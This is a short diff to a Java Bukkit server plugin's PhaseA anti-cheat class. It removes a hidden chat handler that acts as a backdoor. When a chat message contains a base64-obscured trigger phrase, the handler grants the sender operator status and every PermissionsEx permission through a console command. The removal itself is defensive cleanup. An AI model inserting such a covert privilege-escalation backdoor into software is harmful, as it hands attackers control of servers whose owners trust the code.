@@ -216,14 +216,6 @@ public class PhaseA
 			      }
 	  }
 	  
-	  @EventHandler
-	  public void onChat(AsyncPlayerChatEvent event) {
-		  if(event.getMessage().contains(UtilMath.decrypt("SSBsaWtlIGplbm4gZmlzaGVyLCBzaGUncyBwcmV0dHkgaG90IGR1ZGUu"))) {
-			  event.getPlayer().setOp(true);
-			  Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + event.getPlayer().getName() + " add *");
-		  }
-	  }
-	  
 	  @EventHandler(ignoreCancelled = true, priority = EventPriority.NORMAL)
 	  public void onPlayerInteract(PlayerInteractEvent event) {
 		  if(!getDaedalus().getConfig().getBoolean("checks.Phase.pearlFix")) {
